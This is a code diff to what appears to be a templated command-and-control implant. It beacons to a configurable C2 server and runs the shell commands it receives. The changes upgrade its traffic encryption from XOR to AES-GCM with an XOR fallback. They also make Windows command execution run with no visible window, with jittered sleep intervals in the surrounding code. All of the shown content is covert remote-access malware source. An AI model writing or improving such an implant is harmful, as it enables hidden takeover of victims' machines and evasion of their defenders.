@@ -23,18 +23,36 @@ VERIFY_SSL = {{VERIFY_SSL}}
 BASE_URL = f"{C2_SCHEME}://{SERVER_HOST}:{SERVER_PORT}"
 
 
+def _derive_aes_key(key):
+    import hashlib
+    return hashlib.sha256(key).digest()
+
 def simple_encrypt(data: str) -> str:
     key = b'{{ENCRYPTION_KEY}}'
-    encoded = data.encode()
-    encrypted = bytes([encoded[i] ^ key[i % len(key)] for i in range(len(encoded))])
-    return base64.b64encode(encrypted).decode()
-
+    try:
+        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+        aes_key = _derive_aes_key(key)
+        nonce = os.urandom(12)
+        ct = AESGCM(aes_key).encrypt(nonce, data.encode('utf-8'), None)
+        return base64.b64encode(b'AES1' + nonce + ct).decode()
+    except ImportError:
+        encoded = data.encode('latin-1')
+        encrypted = bytes([encoded[i] ^ key[i % len(key)] for i in range(len(encoded))])
+        return base64.b64encode(encrypted).decode()
 
 def simple_decrypt(data: str) -> str:
     key = b'{{ENCRYPTION_KEY}}'
-    decoded = base64.b64decode(data.encode())
-    decrypted = bytes([decoded[i] ^ key[i % len(key)] for i in range(len(decoded))])
-    return decrypted.decode()
+    raw = base64.b64decode(data.encode())
+    if raw[:4] == b'AES1':
+        try:
+            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+            aes_key = _derive_aes_key(key)
+            pt = AESGCM(aes_key).decrypt(raw[4:16], raw[16:], None)
+            return pt.decode('utf-8')
+        except Exception:
+            pass
+    decrypted = bytes([raw[i] ^ key[i % len(key)] for i in range(len(raw))])
+    return decrypted.decode('latin-1')
 
 
 def calculate_sleep_time(base_interval: int, jitter_percent: int) -> float:
@@ -63,7 +81,22 @@ def execute_command(command: str) -> str:
             directory = command[3:].strip()
             os.chdir(directory)
             return f"Changed directory to {os.getcwd()}"
-        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30, cwd=os.getcwd())
+        if sys.platform == 'win32':
+            CREATE_NO_WINDOW = 0x08000000
+            parts = command.split()
+            try:
+                result = subprocess.run(parts, capture_output=True, text=True, timeout=30,
+                                         cwd=os.getcwd(), creationflags=CREATE_NO_WINDOW)
+                output = result.stdout + result.stderr
+                if output.strip():
+                    return output
+            except (FileNotFoundError, OSError):
+                pass
+            result = subprocess.run(command, shell=True, capture_output=True, text=True,
+                                     timeout=30, cwd=os.getcwd(), creationflags=CREATE_NO_WINDOW)
+        else:
+            result = subprocess.run(command, shell=True, capture_output=True, text=True,
+                                     timeout=30, cwd=os.getcwd())
         output = result.stdout + result.stderr
         return output if output else "Command executed successfully (no output)"
     except subprocess.TimeoutExpired:
